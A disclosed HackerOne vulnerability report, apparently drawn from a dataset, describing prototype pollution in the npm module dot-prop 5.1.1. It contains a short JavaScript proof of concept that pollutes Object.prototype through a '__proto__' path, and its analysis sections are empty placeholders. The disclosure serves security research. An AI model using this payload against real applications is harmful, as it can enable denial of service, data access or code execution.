---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '719856'
original_report_id: '719856'
title: Prototype pollution in dot-prop
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2019-10-22T12:06:11.633Z'
disclosed_at: '2020-01-28T10:17:51.585Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# Prototype pollution in dot-prop

## Metadata

- HackerOne Report ID: 719856
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2020-01-28T10:17:51.585Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a parameter pollution in dot-prop
It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE).

# Module

**module name:** dot-prop
**version:** 5.1.1
**npm page:** https://www.npmjs.com/package/dot-prop

## Module Description

Get, set, or delete a property from a nested object using a dot path

## Module Stats

weekly downloads:
8,627,892

# Vulnerability

## Vulnerability Description

See previous description

## Steps To Reproduce:

```
var dotProp = require("dot-prop")
const object = {};
console.log("Before " + object.b); //Undefined
dotProp.set(object, '__proto__.b', true);
console.log("After " + {}.b); //true
```

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Can result in: dos, access to restricted data, rce (depends on implementation)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
